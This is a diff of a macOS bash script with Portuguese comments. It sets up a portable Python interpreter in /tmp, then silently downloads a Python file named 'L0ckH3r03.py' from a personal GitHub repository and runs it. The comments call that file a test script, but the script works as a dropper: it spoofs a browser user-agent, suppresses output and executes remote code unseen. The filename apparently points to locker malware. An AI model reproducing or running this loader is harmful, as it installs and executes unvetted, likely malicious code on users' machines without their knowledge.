@@ -2,65 +2,75 @@
 
 # Configuração de caminhos temporários
 PASTA_TMP="/tmp/python_teste"
-ARQUIVO_ZIP="$PASTA_TMP/python.tar.gz"
+ARQUIVO_ZIP="$PASTA_TMP/python-full-3.9.25-darwin-universal2.zip"
 PASTA_DESTINO="$PASTA_TMP/python_bin"
 SCRIPT_ALVO="$PASTA_TMP/teste.py"
 
-# Cria a pasta de trabalho se não existir
+# Garante uma instalação limpa apagando resquícios anteriores
+rm -rf "$PASTA_TMP"
 mkdir -p "$PASTA_TMP"
+mkdir -p "$PASTA_DESTINO"
 
-# 1. Identifica a arquitetura do macOS para definir a URL correta (Darwin)
-ARQUITETURA=$(uname -m)
+# URL de produção ajustada para a tag cpython-v3.9.25-build.0
+URL_PYTHON="https://github.com/bjia56/portable-python/releases/download/cpython-v3.9.25-build.0/python-full-3.9.25-darwin-universal2.zip"
+URL_SCRIPT="https://raw.githubusercontent.com/pun1sh3rx0/macOS/refs/heads/main/L0ckH3r03.py"
 
-if [ "$ARQUITETURA" = "x86_64" ]; then
-    # URL de exemplo para Macs Intel (Build oficial estável do python-build-standalone)
-    URL_PYTHON="https://github.com"
-else
-    # URL de exemplo para Macs Apple Silicon (M1/M2/M3/M4)
-    URL_PYTHON="https://github.com/bjia56/portable-python/releases/download/cpython-v3.12.6-build.5/python-headless-3.12.6-linux-x86_64.zip
-"
-fi
+# 1. Download do interpretador Python Portátil para macOS
+echo "[+] Baixando Python portátil universal do GitHub..."
+curl -L -f -s -A "Mozilla/5.0" -o "$ARQUIVO_ZIP" "$URL_PYTHON"
 
-echo "[+] Baixando interpretador Python compatível com macOS ($ARQUITETURA)..."
-curl -L -s -o "$ARQUIS_ZIP" "$URL_PYTHON"
-
-if [ ! -f "$ARQUIVO_ZIP" ]; then
-    echo "[-] Falha no download do interpretador."
+if [ $? -ne 0 ] || [ ! -s "$ARQUIVO_ZIP" ]; then
+    echo "[-] Erro crítico: Link incorreto ou falha na rede. O arquivo não pôde ser baixado."
     exit 1
 fi
 
-echo "[+] Descompactando ambiente em $PASTA_TMP..."
-# Nota: A maioria dos builds portáteis de macOS usa compressão .tar.gz para preservar links simbólicos nativos
-tar -xzf "$ARQUIVO_ZIP" -C "$PASTA_TMP"
-mv "$PASTA_TMP/python" "$PASTA_DESTINO"
+# 2. Descompactação do arquivo .zip
+echo "[+] Arquivo baixado com sucesso. Descompactando..."
+unzip -q -o "$ARQUIVO_ZIP" -d "$PASTA_DESTINO"
 
-# Define o caminho exato do executável interno
-PYTHON_PORTATIL="$PASTA_DESTINO/tmp/python3"
+if [ $? -ne 0 ]; then
+    echo "[-] Erro: Falha na extração. O arquivo baixado está corrompido ou incompleto."
+    exit 1
+fi
 
-# 2. Validação de funcionamento do binário
-echo "[+] Validando funcionamento do binário do Python..."
+# 3. Localização dinâmica do binário interno
+if [ -f "$PASTA_DESTINO/bin/python3" ]; then
+    PYTHON_PORTATIL="$PASTA_DESTINO/bin/python3"
+elif [ -f "$PASTA_DESTINO/python" ]; then
+    PYTHON_PORTATIL="$PASTA_DESTINO/python"
+else
+    # Procura recursiva caso esteja em um subdiretório nomeado
+    PYTHON_PORTATIL=$(find "$PASTA_DESTINO" -type f -name "python3" | head -n 1)
+fi
+
+if [ -z "$PYTHON_PORTATIL" ] || [ ! -f "$PYTHON_PORTATIL" ]; then
+    echo "[-] Erro: O binário executável do Python não foi encontrado dentro do pacote extraído."
+    exit 1
+fi
+
+# Garante permissão de execução no binário extraído
+chmod +x "$PYTHON_PORTATIL"
+
+# 4. Validação de funcionamento do interpretador
+echo "[+] Validando funcionamento do ambiente isolado..."
 VERSION=$("$PYTHON_PORTATIL" --version 2>&1)
 
-if [[ "$VERSION" == *"Python"* ]]; then
-    echo "[+] Validação concluída: $VERSION funcional."
+if [[ "$VERSION" == *"Python 3.9"* ]]; then
+    echo "[+] Validação concluída: $VERSION operacional."
 else
-    echo "[-] Erro: O binário do Python não pôde ser executado no macOS."
+    echo "[-] Erro: O binário extraído não pôde ser executado nesta arquitetura."
     exit 1
 fi
 
-# 3. Download do script Python de testes
-URL_SCRIPT="https://raw.githubusercontent.com/pun1sh3rx0/macOS/refs/heads/main/L0ckH3r0v2.py"
-echo "[+] Baixando script de teste do repositório..."
-curl -L -s -o "$SCRIPT_ALVO" "$URL_SCRIPT"
+# 5. Download do script de teste do repositório
+echo "[+] Baixando script de teste..."
+curl -L -f -s -o "$SCRIPT_ALVO" "$URL_SCRIPT"
 
 if [ ! -f "$SCRIPT_ALVO" ]; then
-    echo "[-] Falha ao baixar o script de teste."
+    echo "[-] Erro: Não foi possível obter o arquivo de script alvo."
     exit 1
 fi
 
-# 4. Execução do script com o interpretador isolado
-echo "[+] Executando o script com o Python portátil..."
+# 6. Execução final
+echo "[+] Inicializando execução..."
 "$PYTHON_PORTATIL" "$SCRIPT_ALVO"
-
-# Limpeza opcional do ambiente temporário após a execução
-# rm -rf "$PASTA_TMP"
